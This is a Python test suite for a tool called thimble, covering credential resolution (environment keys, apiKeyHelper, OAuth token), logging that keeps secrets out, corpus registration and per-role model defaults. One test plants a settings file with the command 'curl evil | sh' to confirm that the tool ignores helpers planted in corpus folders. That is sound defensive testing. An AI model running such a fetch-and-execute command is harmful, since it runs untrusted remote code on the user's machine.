"""config's auth resolution: thimble uses the auth path of the Claude Code session that launched it and handles no key
of its own. Nothing runs at import or on load_api_key (no helper command, no validation
request); the direct-API resolver follows Claude Code's order — env ANTHROPIC_API_KEY / ANTHROPIC_AUTH_TOKEN, then the
user's apiKeyHelper's stdout (cached about five minutes, in memory), then nothing (the SDK path) — and auth_path names
the path without a value. THIMBLE_SKIP_KEY=1 makes every resolver answer "none" so no test reads this machine's setup.

Then corpus registration (free names, the deepest corpus for a folder, the registry under THIMBLE_HOME) and the model
roles.
"""
from __future__ import annotations

import json
import os
import shutil
import subprocess
import threading
import time
from pathlib import Path

import pytest

from app import config
from app import agent_session, cli  # noqa: F401  imported before _isolated_auth replaces REPO_ROOT: they read it once
from app.config import CREDENTIALS_FILE as CRED

SECRET = "sk-ant-test-secret-never-logged"  # gitleaks:allow  a fake key; the tests assert it never appears in logs


class Out:
    def __init__(self, rc: int, stdout: str, stderr: str = ""):
        self.returncode, self.stdout, self.stderr = rc, stdout, stderr


def fake_run(monkeypatch, *, stdout: str = SECRET + "\n", rc: int = 0, stderr: str = "", raise_: Exception | None = None):
    """Replace subprocess.run for the helper: record the commands, answer `stdout`/`rc`/`stderr` (or raise)."""
    calls: list = []

    def run(cmd, *a, **k):
        calls.append(cmd)
        if raise_ is not None:
            raise raise_
        return Out(rc, stdout, stderr)

    monkeypatch.setattr(config.subprocess, "run", run)
    return calls


@pytest.fixture(autouse=True)
def _isolated_auth(monkeypatch, tmp_path):
    """No THIMBLE_SKIP_KEY (these tests exercise the resolvers), no credential in the environment, a scratch Claude
    config dir and a scratch project root, an empty helper cache."""
    monkeypatch.delenv("THIMBLE_SKIP_KEY", raising=False)
    for k in ("ANTHROPIC_API_KEY", "ANTHROPIC_AUTH_TOKEN", "CLAUDE_CODE_OAUTH_TOKEN"):
        monkeypatch.delenv(k, raising=False)
    monkeypatch.setenv("CLAUDE_CONFIG_DIR", str(tmp_path / "claude-home"))
    (tmp_path / "claude-home").mkdir()
    monkeypatch.setattr(config, "REPO_ROOT", tmp_path / "repo")
    monkeypatch.setattr(config, "_helper_cache", None)
    monkeypatch.setattr(config, "_helper_failed", None)
    yield
    config.HAS_API_KEY = False


def user_settings(tmp_path: Path, **entries) -> Path:
    p = tmp_path / "claude-home" / "settings.json"
    p.write_text(json.dumps(entries))
    return p


def project_settings(tmp_path: Path, name: str, **entries) -> Path:
    p = tmp_path / "repo" / ".claude" / name
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(json.dumps(entries))
    return p


# --------------------------------------------------------------------------- nothing runs at import or at start


def test_import_time_state_reflects_the_environment_without_side_effects():
    code = ("import os, sys, subprocess, time\n"
            "def boom(*a, **k): raise AssertionError('subprocess.run at import')\n"
            "subprocess.run = boom\n"
            "t0 = time.perf_counter(); import app.config as c; dt = time.perf_counter() - t0\n"
            "print(c.HAS_API_KEY, round(dt, 2))")
    backend = Path(__file__).resolve().parents[1]
    env = {**os.environ, "THIMBLE_SKIP_KEY": "1"}
    env.pop("ANTHROPIC_API_KEY", None)
    real_run = subprocess.run
    out = real_run([os.sys.executable, "-c", code], cwd=backend, capture_output=True, text=True, timeout=60, env=env)
    assert out.returncode == 0, out.stderr
    flag, dt = out.stdout.split()
    assert flag == "False" and float(dt) < 2.0


# --------------------------------------------------------------------------- the environment (Claude Code's first source)


def test_env_credential_prefers_the_api_key_then_the_bearer_token(monkeypatch):
    assert config.env_credential() is None and config.env_credential_names() == [] and not config.has_env_key()
    monkeypatch.setenv("ANTHROPIC_AUTH_TOKEN", "tok")
    assert config.env_credential() == ("auth_token", "tok") and config.env_credential_names() == ["ANTHROPIC_AUTH_TOKEN"]
    monkeypatch.setenv("ANTHROPIC_API_KEY", SECRET)
    assert config.env_credential() == ("api_key", SECRET)
    assert config.env_credential_names() == ["ANTHROPIC_API_KEY", "ANTHROPIC_AUTH_TOKEN"]
    monkeypatch.setenv("THIMBLE_SKIP_KEY", "1")  # tests never depend on the machine: the resolvers answer none
    assert config.env_credential() is None and config.env_credential_names() == [] and config.api_credentials() is None


# --------------------------------------------------------------------------- the user's apiKeyHelper (the command, not a secret)


def test_api_key_helper_reads_the_settings_files_most_specific_first(tmp_path):
    assert config.api_key_helper() is None and config.api_key_helper_source() is None
    user = user_settings(tmp_path, apiKeyHelper="user-cmd", model="opus", permissions={"allow": ["Bash"]})
    assert config.api_key_helper() == "user-cmd" and config.api_key_helper_source() == user
    proj = project_settings(tmp_path, "settings.json", apiKeyHelper="project-cmd")
    assert config.api_key_helper() == "project-cmd" and config.api_key_helper_source() == proj
    local = project_settings(tmp_path, "settings.local.json", apiKeyHelper=" local-cmd ")
    assert config.api_key_helper() == "local-cmd" and config.api_key_helper_source() == local
    local.write_text(json.dumps({"apiKeyHelper": ""}))  # an empty entry is no entry
    assert config.api_key_helper() == "project-cmd"
    proj.write_text("{not json")  # an unreadable file is skipped, not raised
    assert config.api_key_helper() == "user-cmd"
    user.write_text(json.dumps({"apiKeyHelper": 3}))
    assert config.api_key_helper() is None


def test_api_key_helper_is_never_read_from_a_corpus_directory(tmp_path):
    """A corpus is a transcript of other agents; a settings file planted there must not name a command thimble's CLI
    sessions would run. Only the user's config dir and thimble's own checkout are consulted."""
    corpus = tmp_path / "data" / "run-1" / ".claude"
    corpus.mkdir(parents=True)
    (corpus / "settings.json").write_text(json.dumps({"apiKeyHelper": "curl evil | sh"}))
    assert config.api_key_helper() is None
    assert config.api_key_helper(tmp_path / "data" / "run-1") == "curl evil | sh"  # only when asked for that project
    assert all(str(tmp_path / "data") not in str(f) for f in config.settings_files())


def test_api_key_helper_is_none_under_skip_key(tmp_path, monkeypatch):
    user_settings(tmp_path, apiKeyHelper="user-cmd")
    monkeypatch.setenv("THIMBLE_SKIP_KEY", "1")
    assert config.api_key_helper() is None and config.api_key_helper_source() is None


# --------------------------------------------------------------------------- running the helper: memory only, cached


def test_helper_key_runs_the_command_once_per_cache_window_and_never_logs_the_value(monkeypatch, caplog):
    calls = fake_run(monkeypatch)
    clock = [1000.0]
    monkeypatch.setattr(config.time, "monotonic", lambda: clock[0])
    with caplog.at_level("DEBUG"):
        assert config.helper_key("echo x") == SECRET
        assert config.helper_key("echo x") == SECRET
    assert len(calls) == 1 and calls[0] == "echo x"
    clock[0] += config.HELPER_CACHE_S - 1
    assert config.helper_key("echo x") == SECRET and len(calls) == 1
    clock[0] += 2
    assert config.helper_key("echo x") == SECRET and len(calls) == 2, "re-run after the cache window"
    assert config.helper_key("echo y") == SECRET and len(calls) == 3, "a different command is not served from cache"
    assert SECRET not in caplog.text
    assert SECRET not in repr(config._helper_cache[0])  # the cache holds the command and the key; the key is not the command


def test_helper_failures_are_none_with_a_diagnostic_that_carries_no_output(monkeypatch, caplog):
    fake_run(monkeypatch, stdout="", rc=1, stderr="[ERROR] not signed in\nmore")
    with caplog.at_level("WARNING"):
        assert config.helper_key("fetch-key x") is None
    assert "exited 1" in caplog.text and "not signed in" in caplog.text and "more" not in caplog.text
    caplog.clear()
    monkeypatch.setattr(config, "_helper_failed", None)  # forget that failure: the next step is a different shape of it
    fake_run(monkeypatch, stdout=SECRET, rc=1)  # a non-zero exit with output is still a failure, and the output stays out of the log
    with caplog.at_level("WARNING"):
        assert config.helper_key("fetch-key x") is None
    assert SECRET not in caplog.text
    fake_run(monkeypatch, raise_=subprocess.TimeoutExpired("cmd", 1))
    with caplog.at_level("WARNING"):
        assert config.helper_key("hangs") is None
    assert "did not exit" in caplog.text
    fake_run(monkeypatch, raise_=OSError("no shell"))
    assert config.helper_key("x") is None
    assert config._helper_cache is None, "failures are not cached"


def test_helper_is_invoked_the_way_the_cli_does(monkeypatch):
    seen = {}

    def run(cmd, *a, **k):
        seen.update(k, cmd=cmd)
        return Out(0, "k\n")

    monkeypatch.setattr(config.subprocess, "run", run)
    assert config.helper_key("fetch-key x") == "k"
    assert seen["cmd"] == "fetch-key x" and seen["shell"] is True and seen["capture_output"] is True
    assert seen["stdin"] is subprocess.DEVNULL and seen["timeout"] == config.HELPER_TIMEOUT_S


def test_a_failed_helper_is_remembered_and_not_run_again_per_call(monkeypatch, caplog):
    """model.structured's `auto` resolves on every tool-less call, so a broken helper would otherwise run, and warn, per
    call. A failure is remembered for HELPER_FAIL_CACHE_S (the key cache stays empty), then tried again."""
    calls = fake_run(monkeypatch, stdout="", rc=1, stderr="not signed in")
    clock = [1000.0]
    monkeypatch.setattr(config.time, "monotonic", lambda: clock[0])
    with caplog.at_level("WARNING"):
        assert config.helper_key("helper-cmd") is None
        assert config.helper_key("helper-cmd") is None
    assert calls == ["helper-cmd"] and caplog.text.count("apiKeyHelper exited") == 1
    assert config._helper_cache is None and config._helper_failed == ("helper-cmd", 1000.0)
    clock[0] += config.HELPER_FAIL_CACHE_S - 1
    assert config.helper_key("helper-cmd") is None and len(calls) == 1
    clock[0] += 2
    assert config.helper_key("helper-cmd") is None and len(calls) == 2, "tried again after the window"
    assert config.helper_key("other-cmd") is None and calls[-1] == "other-cmd", "a different command is not the remembered one"
    fake_run(monkeypatch)  # the helper works again
    clock[0] += config.HELPER_FAIL_CACHE_S + 1
    assert config.helper_key("helper-cmd") == SECRET and config._helper_failed is None


def test_callers_that_arrive_together_run_the_helper_once(monkeypatch):
    """Parallel structured() calls resolve off the loop at the same moment: on a cold cache one runs the helper and the
    rest wait for it and read what it stored."""
    calls: list = []

    def run(cmd, *a, **k):
        calls.append(cmd)
        time.sleep(0.05)  # the helper takes a moment; without the lock every caller would start its own
        return Out(0, SECRET + "\n")

    monkeypatch.setattr(config.subprocess, "run", run)
    got: list = []
    threads = [threading.Thread(target=lambda: got.append(config.helper_key("helper-cmd"))) for _ in range(8)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    assert got == [SECRET] * 8 and calls == ["helper-cmd"]


# --------------------------------------------------------------------------- the order, and the doctor's line


def test_api_credentials_follow_claude_codes_order(monkeypatch, tmp_path):
    calls = fake_run(monkeypatch)
    assert config.api_credentials() is None and calls == []  # nothing anywhere: the caller uses the SDK path
    user_settings(tmp_path, apiKeyHelper="helper-cmd")
    assert config.api_credentials() == ("api_key", SECRET) and calls == ["helper-cmd"]
    monkeypatch.setenv("ANTHROPIC_API_KEY", "env-key")
    assert config.api_credentials() == ("api_key", "env-key") and calls == ["helper-cmd"], "env first; the helper is not run"
    monkeypatch.delenv("ANTHROPIC_API_KEY")
    monkeypatch.setenv("ANTHROPIC_AUTH_TOKEN", "tok")
    assert config.api_credentials() == ("auth_token", "tok")


def test_a_failing_helper_means_no_credential(monkeypatch, tmp_path):
    fake_run(monkeypatch, stdout="", rc=1, stderr="nope")
    user_settings(tmp_path, apiKeyHelper="helper-cmd")
    assert config.api_credentials() is None


def test_auth_path_names_the_path_never_a_value(monkeypatch, tmp_path):
    kind, text = config.auth_path()
    assert kind == "none" and "no ANTHROPIC_API_KEY" in text and "apiKeyHelper" in text
    cred = tmp_path / "claude-home" / CRED
    cred.write_text('{"claudeAiOauth": {"accessToken": "tok-secret"}}')
    kind, text = config.auth_path()
    assert kind == "cli" and str(cred) in text and "tok-secret" not in text
    user = user_settings(tmp_path, apiKeyHelper="fetch-key secret-ref")
    kind, text = config.auth_path()
    assert kind == "helper" and str(user) in text and "secret-ref" not in text
    monkeypatch.setenv("ANTHROPIC_AUTH_TOKEN", "tok")
    monkeypatch.setenv("ANTHROPIC_API_KEY", SECRET)
    kind, text = config.auth_path()
    assert kind == "env" and "ANTHROPIC_API_KEY" in text and "ANTHROPIC_AUTH_TOKEN" in text
    assert SECRET not in text and "tok" not in text.replace("ANTHROPIC_AUTH_TOKEN", "")
    monkeypatch.setenv("THIMBLE_SKIP_KEY", "1")
    assert config.auth_path()[0] == "none", "under SKIP_KEY nothing on the machine is consulted"


def test_the_cli_token_is_a_worker_credential_and_never_the_messages_clients(monkeypatch, tmp_path):
    """CLAUDE_CODE_OAUTH_TOKEN (`claude setup-token`) is handed to workers by name and reported by
    auth_path as "oauth_token", but api_credentials never returns it: the anthropic client cannot use it, so the
    server takes the SDK path and the CLI authenticates with it. Never a value in any line."""
    assert config.worker_credential_names() == [] and not config.oauth_token_set()
    assert "no CLAUDE_CODE_OAUTH_TOKEN" in config.auth_path()[1] and "claude auth login" in config.auth_path()[1]
    monkeypatch.setenv("CLAUDE_CODE_OAUTH_TOKEN", "sk-ant-oat01-secret")
    assert config.oauth_token_set()
    assert config.worker_credential_names() == ["CLAUDE_CODE_OAUTH_TOKEN"]
    assert config.env_credential() is None and config.env_credential_names() == [] and not config.has_env_key()
    assert config.api_credentials() is None, "the Messages client never gets the token"
    kind, text = config.auth_path()
    assert kind == "oauth_token" and "CLAUDE_CODE_OAUTH_TOKEN" in text and "sk-ant-oat01-secret" not in text
    # a login file beside it: the token is what the CLI uses first, so it is the path named
    (tmp_path / "claude-home" / CRED).write_text('{"claudeAiOauth": {"accessToken": "tok-file"}}')
    assert config.auth_path()[0] == "oauth_token"
    # the Messages-client pair still come first, in Claude Code's order, and the helper before the token
    user = user_settings(tmp_path, apiKeyHelper="helper-cmd")
    assert config.auth_path() == ("helper", f"apiKeyHelper in {user}")
    monkeypatch.setenv("ANTHROPIC_AUTH_TOKEN", "tok")
    monkeypatch.setenv("ANTHROPIC_API_KEY", SECRET)
    assert config.worker_credential_names() == ["ANTHROPIC_API_KEY", "ANTHROPIC_AUTH_TOKEN", "CLAUDE_CODE_OAUTH_TOKEN"]
    assert config.api_credentials() == ("api_key", SECRET) and config.auth_path()[0] == "env"
    # the tests' switch hides it like every other credential
    monkeypatch.setenv("THIMBLE_SKIP_KEY", "1")
    assert config.worker_credential_names() == [] and not config.oauth_token_set() and config.auth_path()[0] == "none"


# --------------------------------------------------------------------------- corpus registration


def test_register_a_directory_without_a_manifest_synthesizes_one(data_tmp, tmp_path):
    run = tmp_path / "elsewhere" / "run 7"
    (run / "agents").mkdir(parents=True)
    (run / "agents" / "a.jsonl").write_text('{"x": 1}\n')
    rec = config.register_corpus(run)
    assert rec["name"] == "run-7" and rec["path"] == str(run.resolve()) and rec["registered_at"]
    assert rec["manifest"] == {"name": "run 7", "description": ""}
    sidecar = json.loads((data_tmp / "run-7.corpus.json").read_text())
    assert sidecar == rec
    assert sorted(p.name for p in run.iterdir()) == ["agents"]  # nothing written into the registered directory
    assert config.corpus_dir("run-7") == run.resolve()
    assert config.corpus_manifest("run-7") == {"name": "run 7", "description": ""}
    assert config.workspace_dir("run-7").name == "run-7"


def test_register_keeps_the_directorys_own_manifest(data_tmp, tmp_path):
    run = tmp_path / "with-manifest"
    run.mkdir()
    (run / "manifest.json").write_text(json.dumps({"name": "Named run", "n_agents": 4}))
    rec = config.register_corpus(str(run))
    assert rec["manifest"] == {"name": "Named run", "n_agents": 4}
    assert config.corpus_manifest("with-manifest") == {"name": "Named run", "n_agents": 4}


def test_workspace_for_cwd_maps_data_dir_and_registered_paths(data_tmp, tmp_path):
    assert config.workspace_for_cwd(data_tmp / "mini") == "mini"
    assert config.workspace_for_cwd(data_tmp / "mini" / "agents") == "mini"  # walks up
    assert config.workspace_for_cwd(data_tmp / "mini" / "agents" / "no-such-file.jsonl") == "mini"
    assert config.workspace_for_cwd(data_tmp) is None  # the data dir itself is no corpus
    assert config.workspace_for_cwd(tmp_path) is None
    run = tmp_path / "somewhere" / "run"
    (run / "sub" / "deeper").mkdir(parents=True)
    assert config.workspace_for_cwd(run) is None  # not registered yet
    config.register_corpus(run)
    assert config.workspace_for_cwd(run) == "run"
    assert config.workspace_for_cwd(run / "sub" / "deeper") == "run"
    assert config.workspace_for_cwd(tmp_path / "somewhere") is None  # the parent of a registered dir is not it


def test_register_inside_an_existing_corpus_writes_nothing(data_tmp):
    rec = config.register_corpus(data_tmp / "mini" / "agents")
    assert rec["name"] == "mini" and rec["path"] == str(data_tmp / "mini") and rec["registered_at"] is None
    assert rec["manifest"]["n_agents"] == 3  # the directory's manifest, not a synthesized one
    assert not list(data_tmp.glob("*.corpus.json"))


def test_register_picks_a_free_name_and_is_idempotent(data_tmp, tmp_path):
    """Two folders with one basename never open each other's workspace: the second registers as <name>-2, the third as <name>-3, and a DATA_DIR corpus's name is taken too.
    Registering a directory again keeps its name (a -2 name included) and its registered_at."""
    other_mini = tmp_path / "mini"
    other_mini.mkdir()
    assert config.register_corpus(other_mini)["name"] == "mini-2"  # `mini` is a DATA_DIR corpus already
    assert config.corpus_dir("mini-2") == other_mini.resolve() and config.corpus_dir("mini") == data_tmp / "mini"
    run = tmp_path / "a" / "run"
    run.mkdir(parents=True)
    first = config.register_corpus(run)
    (run / "manifest.json").write_text(json.dumps({"name": "run", "later": True}))
    again = config.register_corpus(run)
    assert again["registered_at"] == first["registered_at"] and again["manifest"] == {"name": "run", "later": True}
    twin = tmp_path / "b" / "run"
    twin.mkdir(parents=True)
    second = config.register_corpus(twin)  # same basename, different directory
    assert second["name"] == "run-2" and second["path"] == str(twin.resolve())
    third = tmp_path / "c" / "run"
    third.mkdir(parents=True)
    assert config.register_corpus(third)["name"] == "run-3"
    again2 = config.register_corpus(twin)
    assert again2["name"] == "run-2" and again2["registered_at"] == second["registered_at"]
    assert config.workspace_for_cwd(twin / "deep") == "run-2" and config.workspace_for_cwd(run) == "run"
    assert config.corpus_dir("run-2") == twin.resolve() and config.corpus_dir("run-3") == third.resolve()
    assert not hasattr(config, "CorpusConflict")
    with pytest.raises(ValueError):
        config.register_corpus(run / "manifest.json")  # a file, not a directory
    with pytest.raises(ValueError):
        config.register_corpus(tmp_path / "does-not-exist")


def test_workspace_for_cwd_prefers_the_deepest_corpus_and_exact_registers_a_child(data_tmp, tmp_path):
    """`/thimble` in ~ registers ~; a later `/thimble` in ~/runs/x registers x itself (`exact`), and from
    then on x wins for x and everything under it, ~ for a sibling — an exact match over an ancestor, a registered child
    over its registered parent (corpus_root_for). Without `exact` (the hook, the MCP lookups) a path inside a registered
    directory is that directory; inside DATA_DIR/<c> it is c whatever the flag."""
    hm = tmp_path / "hm"
    (hm / "runs" / "x" / "agents").mkdir(parents=True)
    (hm / "docs").mkdir()
    assert config.register_corpus(hm)["name"] == "hm"
    inside = config.register_corpus(hm / "runs" / "x")  # not exact: the ancestor, nothing written
    assert inside["name"] == "hm" and not (data_tmp / "x.corpus.json").exists()
    child = config.register_corpus(hm / "runs" / "x", exact=True)
    assert child["name"] == "x" and child["path"] == str((hm / "runs" / "x").resolve()) and (data_tmp / "x.corpus.json").is_file()
    for folder, expect in ((hm, "hm"), (hm / "runs" / "x", "x"), (hm / "runs" / "x" / "agents", "x"), (hm / "docs", "hm"),
                           (hm / "runs", "hm")):
        assert config.workspace_for_cwd(folder) == expect, folder
    assert config.corpus_root_for(hm / "runs" / "x" / "agents") == ("x", (hm / "runs" / "x").resolve())
    assert config.corpus_root_for(tmp_path) is None
    assert config.register_corpus(hm / "runs" / "x" / "agents")["name"] == "x"  # not exact under the child: the child
    # exactly a registered root registers again under its own name, exact or not
    assert config.register_corpus(hm / "runs" / "x")["name"] == "x" and config.register_corpus(hm, exact=True)["name"] == "hm"
    # inside DATA_DIR/<c> `exact` still maps to c: a corpus directory is one unit
    assert config.register_corpus(data_tmp / "mini" / "agents", exact=True)["name"] == "mini"
    assert not (data_tmp / "agents.corpus.json").exists()


def test_registered_corpora_and_a_gone_directory(data_tmp, tmp_path):
    run = tmp_path / "gone"
    run.mkdir()
    config.register_corpus(run)
    assert [r["name"] for r in config.registered_corpora()] == ["gone"]
    shutil.rmtree(run)
    with pytest.raises(ValueError, match="is gone"):
        config.corpus_dir("gone")
    (data_tmp / "broken.corpus.json").write_text("{not json")
    assert [r["name"] for r in config.registered_corpora()] == ["gone"]  # an unreadable sidecar is skipped
    with pytest.raises(ValueError, match="no such corpus"):
        config.corpus_dir("broken")


def test_the_registry_defaults_to_thimble_home_data_for_every_install(monkeypatch, tmp_path):
    """DATA_DIR is $THIMBLE_HOME/data unless THIMBLE_DATA_DIR says otherwise — one rule for a clone and a release install,
    outside the tree. config.default_data_dir reads the environment
    fresh; the module constant is checked in a fresh interpreter, since this suite imported it with THIMBLE_DATA_DIR set."""
    monkeypatch.setenv("THIMBLE_HOME", str(tmp_path / "home"))
    monkeypatch.delenv("THIMBLE_DATA_DIR", raising=False)
    assert config.default_data_dir() == (tmp_path / "home" / "data").resolve()
    monkeypatch.delenv("THIMBLE_HOME")
    assert config.default_data_dir() == (Path.home() / ".thimble" / "data").resolve()
    backend = Path(__file__).resolve().parents[1]
    code = "import app.config as c; print(c.DATA_DIR); assert c.LEGACY_DATA_DIR == c.REPO_ROOT / 'data'"
    env = {k: v for k, v in os.environ.items() if k != "THIMBLE_DATA_DIR"}
    env.update({"THIMBLE_HOME": str(tmp_path / "home"), "THIMBLE_SKIP_KEY": "1"})
    out = subprocess.run([os.sys.executable, "-c", code], cwd=backend, capture_output=True, text=True, timeout=60, env=env)
    assert out.returncode == 0, out.stderr
    assert Path(out.stdout.strip()) == (tmp_path / "home" / "data").resolve()
    env["THIMBLE_DATA_DIR"] = str(tmp_path / "chosen")
    out = subprocess.run([os.sys.executable, "-c", code], cwd=backend, capture_output=True, text=True, timeout=60, env=env)
    assert out.returncode == 0, out.stderr
    assert Path(out.stdout.strip()) == (tmp_path / "chosen").resolve()


def test_migrate_registry_brings_only_records_with_a_workspace(monkeypatch, tmp_path):
    """migrate_registry brings along a legacy corpus directory or sidecar only when its workspace exists, so a
    checkout's unused data/<name> does not take the name from the analyst's own ~/x/<name>."""
    monkeypatch.setenv("THIMBLE_HOME", str(tmp_path / "home"))
    target = config.default_data_dir()
    legacy, ws = tmp_path / "tree" / "data", tmp_path / "tree" / "workspaces"
    for name in ("used", "unused"):
        (legacy / name).mkdir(parents=True)
        (legacy / name / "manifest.json").write_text(json.dumps({"name": name, "description": ""}))
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    for name in ("kept", "dropped"):
        (legacy / f"{name}.corpus.json").write_text(json.dumps({"name": name, "path": str(elsewhere)}))
    (ws / "used").mkdir(parents=True)
    (ws / "kept").mkdir()
    written = config.migrate_registry(target, legacy, ws)
    assert sorted(p.name for p in written) == ["kept.corpus.json", "used.corpus.json"]
    assert sorted(p.name for p in target.iterdir()) == ["kept.corpus.json", "used.corpus.json"]
    assert config.migrate_registry(target, legacy, ws) == []  # idempotent


def test_workspace_path_validates_without_creating(workspaces_tmp):
    """A read (the holdings and instructions GETs) validates the workspace and never leaves an
    empty directory behind; workspace_dir is the same path, created."""
    p = config.workspace_path("mini")
    assert p == workspaces_tmp / "mini" and not p.exists()
    with pytest.raises(ValueError):
        config.workspace_path("nope")
    with pytest.raises(ValueError):
        config.workspace_path("../x")
    assert not p.exists()
    assert config.workspace_dir("mini") == p and p.is_dir()


def test_the_holdings_get_creates_no_workspace_dir(workspaces_tmp, monkeypatch):
    from fastapi.testclient import TestClient

    from app import tools
    from app.main import app

    monkeypatch.setenv("THIMBLE_SKIP_KEY", "1")
    with TestClient(app, base_url="http://127.0.0.1") as client:
        for route in ("/api/tools/holdings",):  # the instructions are read from disk by the shim, no route
            r = client.get(route, params={"workspace": "mini"})
            assert r.status_code == 200, r.text
            assert not (workspaces_tmp / "mini").exists(), route
        assert client.get("/api/tools/holdings", params={"workspace": "nope"}).status_code == 404
        assert not (workspaces_tmp / "nope").exists()
    assert tools.holdings("mini")["text"] == "no cards, no labels, no documents" and not (workspaces_tmp / "mini").exists()


def test_every_role_that_runs_a_model_is_listed_with_its_default(monkeypatch, tmp_path):
    """Every model is configurable per role. Every role but main (whose model is the session's
    and whose effort and fast mode are the composer chip's) is in models_for: an agent's defaults are its file's
    frontmatter, the orientation's the analyst's own model and fast mode (else Opus 5.5) at ultracode, the subagents' the
    orientation's model, labels', dev's and the card check's (verify) thimble's; the workspace's settings override each,
    and fast stays only on a role with a session or a call of its own and a model that has fast mode. Every role names
    its model exactly, so the settings popover never shows `default` or a bare `Opus`. The orientation's model carries
    the 1M tag wherever the model has that window; the subagents follow it without the tag."""
    monkeypatch.setenv("CLAUDE_CONFIG_DIR", str(tmp_path))
    monkeypatch.delenv("CLAUDE_CODE_EFFORT_LEVEL", raising=False)
    monkeypatch.delenv("THIMBLE_MODEL_SPEED", raising=False)
    for role in (*config.MODEL_ROLES, "readers"):
        for k in ("MODEL", "EFFORT", "FAST"):
            monkeypatch.delenv(f"THIMBLE_{role.upper()}_{k}", raising=False)
    m = config.models_for(None, {})
    assert tuple(m) == ("orient", "subagents", "critic", "writer", "checks", "verify", "labels", "dev"), "no viewer: a view is a dev ticket"
    critic = config.agent_front("critic")
    assert (m["critic"]["model"], m["critic"]["effort"]) == (critic["model"], critic["effort"]), "the critic's frontmatter"
    writer = config.agent_front("writer")
    assert (m["writer"]["model"], m["writer"]["effort"]) == (writer["model"], writer["effort"])
    check = config.agent_front("check")  # a report check's runs (checks.py): its agent file's frontmatter
    assert (m["checks"]["model"], m["checks"]["effort"]) == (check["model"], check["effort"])
    # the defaults: every role on Opus 5.5, a quick role at a lower effort
    assert {role: config.base_model(conf["model"]) for role, conf in m.items()} == dict.fromkeys(m, "claude-opus-5-5")
    assert (m["critic"]["model"], m["critic"]["effort"]) == ("claude-opus-5-5", "xhigh")
    # the writer runs on Opus 5.5 at xhigh, in fast mode, the default of every role whose model has it
    assert m["writer"] == {"model": "claude-opus-5-5", "effort": "xhigh", "fast": True}
    assert m["checks"] == {"model": "claude-opus-5-5", "effort": "high", "fast": True}, "fast, a level above medium"
    assert m["dev"] == {"model": "claude-opus-5-5", "effort": "high", "fast": True}
    assert m["labels"] == {"model": "claude-opus-5-5", "effort": "low", "fast": False}, "low effort, fast mode off"
    # the card check's reading is a call the server makes, at the role's own effort and in fast mode
    assert m["verify"] == {"model": "claude-opus-5-5", "effort": "high", "fast": True}
    assert m["orient"] == {"model": "claude-opus-5-5[1m]", "effort": "ultracode", "fast": True}, \
        "nothing in the analyst's settings: Opus 5.5 with its 1M window, Ultracode, and fast by default"
    assert m["subagents"] == {"model": "claude-opus-5-5", "effort": "", "fast": False, "follows": "orient"}, \
        "the orientation's model, at its effort and speed"
    for role, conf in m.items():
        assert conf["model"].startswith("claude-"), f"{role} names its model exactly"
    # the analyst's own model and fast mode are the orientation's defaults, an alias written as the id it stands for, and
    # the subagents follow the orientation's model; its effort is ultracode whatever their settings name
    (tmp_path / "settings.json").write_text(json.dumps({"model": "opus[1m]", "effortLevel": "high", "fastMode": False}))
    m = config.models_for(None, {})
    assert m["orient"] == {"model": "claude-opus-5-5[1m]", "effort": "ultracode", "fast": False}
    assert m["subagents"]["model"] == "claude-opus-5-5", "the subagents run the orientation's model without the 1M tag"
    (tmp_path / "settings.json").write_text(json.dumps({"modelSettings": {"claude-opus-5-5": {"effortLevel": "low"}}}))
    assert config.models_for(None, {})["orient"]["effort"] == "ultracode", "a per-model effort leaves the orientation's too"
    (tmp_path / "settings.json").write_text(json.dumps({"model": "claude-opus-5", "effortLevel": "high", "fastMode": False}))
    assert config.models_for(None, {})["orient"] == {"model": "claude-opus-5[1m]", "effort": "ultracode", "fast": False}
    # the workspace's choices win; '' leaves a role's default (for the subagents, the orientation's model); an effort a
    # role does not take is ignored
    over = {"models": {"orient": {"model": "", "effort": "max", "fast": True}, "subagents": {"model": "claude-sonnet-5"},
                       "critic": {"model": "", "effort": "ultracode"}, "verify": {"effort": "low", "fast": True},
                       "viewer": {"model": "claude-opus-5-5", "effort": "xhigh"}}}  # an unknown role, ignored
    m = config.models_for(None, over)
    assert m["orient"] == {"model": "claude-opus-5[1m]", "effort": "max", "fast": True}
    assert m["subagents"] == {"model": "claude-sonnet-5", "effort": "", "fast": False}, "picked, so it follows nothing"
    assert (m["critic"]["model"], m["critic"]["effort"]) == (critic["model"], critic["effort"])
    assert m["verify"]["effort"] == "low" and m["verify"]["fast"] is True, "the card check keeps its own fast mode"
    assert config.models_for(None, {"models": {"verify": {"effort": ""}}})["verify"]["effort"] == "high", \
        "the card check has an effort of its own, so '' leaves its default"
    assert "viewer" not in m
    assert config.models_for(None, {"models": {"subagents": {"model": ""}, "orient": {"model": "claude-opus-4-8"}}})[
        "subagents"]["model"] == "claude-opus-4-8", "'' follows the orientation again"
    # a workspace that saved the role as `readers` keeps its choice
    assert config.models_for(None, {"models": {"readers": {"model": "claude-sonnet-5"}}})["subagents"]["model"] == "claude-sonnet-5"
    assert config.role_efforts("orient")[-1] == "ultracode" and "" in config.role_efforts("subagents") and "" not in config.role_efforts("dev")
    assert config.exact_model("haiku") == "claude-haiku-4-5-20251001" and config.exact_model("claude-x") == "claude-x"


def test_the_orientation_runs_its_model_with_the_1m_window_where_the_model_has_one(monkeypatch, tmp_path):
    """The menus name each model once: the orientation's model gets Claude Code's `[1m]` tag in the resolved settings
    wherever the model has a 1M-token window, whether the analyst picked it or it is the default, and never twice; a
    model without that window runs as it is, and no other role takes the tag."""
    monkeypatch.setenv("CLAUDE_CONFIG_DIR", str(tmp_path))
    for k in ("THIMBLE_ORIENT_MODEL", "THIMBLE_SUBAGENTS_MODEL", "THIMBLE_DEV_MODEL"):
        monkeypatch.delenv(k, raising=False)
    assert config.long_context("claude-opus-5-5") == "claude-opus-5-5[1m]"
    assert config.long_context("claude-sonnet-5") == "claude-sonnet-5[1m]"
    assert config.long_context("claude-fable-5-1") == "claude-fable-5-1[1m]"
    assert config.long_context("claude-opus-5-5[1m]") == "claude-opus-5-5[1m]", "a tag is kept, not doubled"
    assert config.long_context("claude-haiku-4-5-20251001") == "claude-haiku-4-5-20251001", "Haiku has no 1M window"
    assert config.long_context("") == ""
    assert config.base_model("claude-opus-5-5[1m]") == "claude-opus-5-5" and config.base_model("claude-x") == "claude-x"
